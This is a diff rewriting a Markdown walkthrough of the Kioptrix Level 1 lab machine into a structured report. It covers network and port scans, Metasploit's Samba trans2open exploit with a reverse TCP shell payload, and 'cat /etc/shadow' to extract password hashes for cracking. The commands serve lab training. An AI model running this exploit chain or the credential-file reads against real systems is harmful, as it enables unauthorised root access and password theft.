@@ -1,101 +1,118 @@
-# Objective
+# Kioptrix Level 1 - RCE Walkthrough
 
-To gain root access to the system.
+## Objective
 
----
+To gain root-level access to a target system (Kioptrix Level 1) by identifying vulnerabilities, exploiting misconfigurations, and performing post-exploitation analysis.
 
-## Stage 1: Identifying All Possible Exploits
+## Situation
 
-### Step 1: Identifying the Compromised System on the Network
-- **Command:**
-  ```bash
-  sudo netdiscover -P -r <IP>
-  ```
+The target system is discovered on a local network and suspected to be vulnerable due to outdated services. The goal is to enumerate the system, identify exploitable services, and leverage known vulnerabilities to achieve full system compromise.
 
----
+## Task
 
-### Step 2: Running a Port Scan
-- **Command:**
-  ```bash
-  sudo nmap -A -T4 -p- <Target_IP>
-  ```
-- **Findings:**
-  - Multiple open ports and their services:
-    - **Port 22:** SSH
-    - **Port 80:** Apache 1.3 File server
-    - **Port 139:** Samba
-    - **Port 443:** OpenSSL
+- Identify the compromised system on the network
+- Enumerate open ports and running services
+- Research and exploit known vulnerabilities
+- Gain root access to the system
+- Perform post-exploitation activities such as credential extraction
 
----
+## Action
 
-## Stage 2: Exploiting Identified Vulnerabilities
+### Stage 1: Identifying All Possible Exploits
 
-### Step 1: Targeting Samba on Port 443 with Metasploit
-- **Actions:**
-  - Identify Samba version
-  - Search for relevant exploit in Metasploit
-- **Commands:**
-  ```bash
-  msfconsole
-  search smb_version
-  # Set up rhosts and port, then run
-  ```
-- **Findings:**
-  - Samba version identified as 2.2.1a
+#### Network Discovery
 
----
+The system was identified using a network discovery scan to locate active hosts.
 
-### Step 2: Looking Up Exploits for Samba 2.2
-- **Command:**
-  ```bash
-  searchsploit samba 2.2
-  ```
-- **Findings:**
-  - Use `exploit/linux/samba/trans2open`
+```bash
+sudo netdiscover -P -r <IP>
+```
 
----
+#### Port and Service Enumeration
 
-### Step 3: Setting Up a Reverse Shell Payload
-- **Note:**
-  - A reverse shell (connect-back) requires the attacker to set up a listener. The target connects back, giving the attacker a shell.
-- **Commands:**
-  ```bash
-  use exploit/linux/samba/trans2open
-  set rhosts <Target_IP>
-  set payload linux/x86/shell_reverse_tcp
-  run
-  ```
+A full port scan was conducted to identify exposed services and potential attack vectors.
 
----
+```bash
+sudo nmap -A -T4 -p- <Target_IP>
+```
 
-## Stage 3: Gaining Root Access
+**Findings:**
+- Port 22: SSH
+- Port 80: Apache 1.3 file server
+- Port 139: Samba
+- Port 443: OpenSSL
 
-### Step 1: Performing Enumeration
-- **Commands:**
-  ```bash
-  whoami      # Find the current user
-  id          # Check account's access level (0 = root)
-  sudo -l     # List commands that can be run as root
-  ```
-- **Findings:**
-  - Root access obtained; unrestricted access to system files.
+### Stage 2: Exploiting Identified Vulnerabilities
 
----
+#### Samba Version Identification
 
-### Step 3: Post-Exploitation - Credential Extraction
-- **Actions:**
-  - Extract credentials/encrypted passwords from `/etc/shadow`
-  - Extract user details from `/etc/passwd`
-  - Identify password encryption type and use tools like Hashcat for attacks
-- **Commands:**
-  ```bash
-  cat /etc/shadow
-  cat /etc/passwd
-  ```
+Samba services were targeted due to their known history of critical vulnerabilities.
 
----
+```bash
+msfconsole
+search smb_version
+```
+
+**Finding:**
+- Samba version 2.2.1a identified
+
+#### Exploit Research
+
+Public exploit databases were queried to locate relevant exploits for the identified Samba version.
+
+```bash
+searchsploit samba 2.2
+```
+
+**Selected Exploit:**
+- `exploit/linux/samba/trans2open`
+
+#### Reverse Shell Setup and Execution
+
+A reverse TCP shell payload was configured to establish a connection back to the attacker.
+
+```bash
+use exploit/linux/samba/trans2open
+set rhosts <Target_IP>
+set payload linux/x86/shell_reverse_tcp
+run
+```
+
+### Stage 3: Gaining Root Access
+
+#### Enumeration and Privilege Verification
+
+Once shell access was established, system enumeration was performed to verify privilege level.
+
+```bash
+whoami
+id
+sudo -l
+```
+
+**Finding:**
+- Root-level access obtained, allowing unrestricted control over system resources.
+
+#### Post-Exploitation: Credential Extraction
+
+Sensitive system files were accessed to extract user credentials and password hashes for further analysis.
+
+```bash
+cat /etc/shadow
+cat /etc/passwd
+```
+
+## Result
+
+- Successfully identified and exploited a vulnerable Samba service
+- Gained full root access to the target system
+- Extracted credential data for offline password attacks
+- Demonstrated the impact of outdated services and poor patch management
+
+This assessment highlights the critical importance of maintaining updated services and securing network-exposed systems against known exploits.
 
 ## References
-- [Kioptrix Level 1 Walkthrough - Exploiting Apache mod_ssl Privilege Escalation](https://medium.com/@cipher0x00/kioptrix-level-1-walkthrough-exploiting-apache-mod-ssl-privilege-escalation-66bba328b349)
-- [How to Use a Reverse Shell in Metasploit](https://adfoster-r7.github.io/metasploit-framework/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html)
-- [OpenLuck Exploit](https://github.com/heltonWernik/OpenLuck)
+
+- Kioptrix Level 1 Walkthrough – Apache mod_ssl Privilege Escalation
+- How to Use a Reverse Shell in Metasploit
+- OpenLuck Exploit
